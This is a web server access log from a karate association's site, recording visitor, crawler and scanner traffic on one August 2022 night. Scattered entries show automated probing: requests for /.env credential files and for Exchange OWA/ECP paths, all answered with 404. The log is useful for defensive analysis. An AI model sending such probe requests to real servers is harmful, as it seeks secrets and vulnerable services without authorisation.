::ffff:136.62.2.38 - - [24/Aug/2022:02:53:59 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:06 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:13 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:20 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:27 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:34 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:41 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:54:48 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:02:55:19 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:67.160.201.88 - - [24/Aug/2022:02:55:52 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:55:52 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:55:58 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:55:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:55:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:55:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:56:33 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:56:33 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:56:35 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:56:35 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:02:56:36 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:198.235.24.153 - - [24/Aug/2022:03:03:08 +0000] "GET / HTTP/1.0" 200 58158 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:09 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:29 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:45 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:48 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:54 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:57 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:03:59 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:04:00 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:04:06 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [24/Aug/2022:03:04:33 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:185.254.196.115 - - [24/Aug/2022:03:06:06 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [24/Aug/2022:03:06:06 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:2.57.122.209 - - [24/Aug/2022:03:07:11 +0000] "GET http://example.com/ HTTP/1.1" 200 58158 "-" "Go-http-client/1.1"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:26 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:26 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:07:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:08:00 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:08:00 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:08:01 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:08:01 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:08:01 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:66.249.66.214 - - [24/Aug/2022:03:09:06 +0000] "GET /images/Naha-lineage.jpg HTTP/1.1" 200 212379 "-" "Googlebot-Image/1.0"
::ffff:46.161.11.227 - - [24/Aug/2022:03:09:46 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:46.161.11.227 - - [24/Aug/2022:03:09:46 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:46.161.11.227 - - [24/Aug/2022:03:09:47 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:27 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:29 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:30 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:33 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:33 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:36 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:36 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:03:16:37 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:136.62.2.38 - - [24/Aug/2022:03:22:25 +0000] "GET /images/shuri-lineage.jpg HTTP/1.1" 200 120427 "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:03:22:26 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:136.62.2.38 - - [24/Aug/2022:03:22:30 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:207.46.13.168 - - [24/Aug/2022:03:27:08 +0000] "GET /index.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.188 - - [24/Aug/2022:03:28:46 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.66.88 - - [24/Aug/2022:03:31:36 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Googlebot-Image/1.0"
::ffff:192.241.222.213 - - [24/Aug/2022:03:33:06 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.66.18 - - [24/Aug/2022:03:40:25 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.168 - - [24/Aug/2022:03:40:31 +0000] "GET /index.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:192.241.237.25 - - [24/Aug/2022:03:43:21 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 152 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:192.241.236.240 - - [24/Aug/2022:03:43:45 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:192.241.236.205 - - [24/Aug/2022:03:43:54 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 214 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:143.198.40.176 - - [24/Aug/2022:03:44:41 +0000] "GET / HTTP/1.1" 200 58158 "-" "-"
::ffff:192.241.235.163 - - [24/Aug/2022:03:47:15 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:205.210.31.6 - - [24/Aug/2022:03:47:19 +0000] "GET / HTTP/1.1" 200 58158 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:135.125.244.48 - - [24/Aug/2022:03:48:17 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [24/Aug/2022:03:48:18 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.54 - - [24/Aug/2022:03:51:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.26 - - [24/Aug/2022:03:51:26 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.66.56 - - [24/Aug/2022:04:01:36 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Googlebot-Image/1.0"
::ffff:114.119.140.122 - - [24/Aug/2022:04:07:41 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:192.241.220.121 - - [24/Aug/2022:04:07:45 +0000] "GET /ReportServer HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:207.46.13.113 - - [24/Aug/2022:04:10:52 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:192.241.205.211 - - [24/Aug/2022:04:12:52 +0000] "GET /login HTTP/1.1" 404 144 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.66.54 - - [24/Aug/2022:04:17:41 +0000] "GET /resources HTTP/1.1" 200 194906 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.54 - - [24/Aug/2022:04:17:52 +0000] "GET /resources HTTP/1.1" 200 194906 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:136.62.2.38 - - [24/Aug/2022:04:18:19 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:66.249.66.52 - - [24/Aug/2022:04:18:20 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Googlebot-Image/1.0"
::ffff:136.62.2.38 - - [24/Aug/2022:04:18:43 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1"
::ffff:185.189.182.234 - - [24/Aug/2022:04:19:19 +0000] "GET / HTTP/1.1" 200 58158 "-" "-"
::ffff:114.119.152.108 - - [24/Aug/2022:04:24:28 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:20.14.87.3 - - [24/Aug/2022:04:24:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.14.87.3 - - [24/Aug/2022:04:24:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.113 - - [24/Aug/2022:04:25:03 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET / HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /js/common.js HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/tournaments/NKD8202022.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
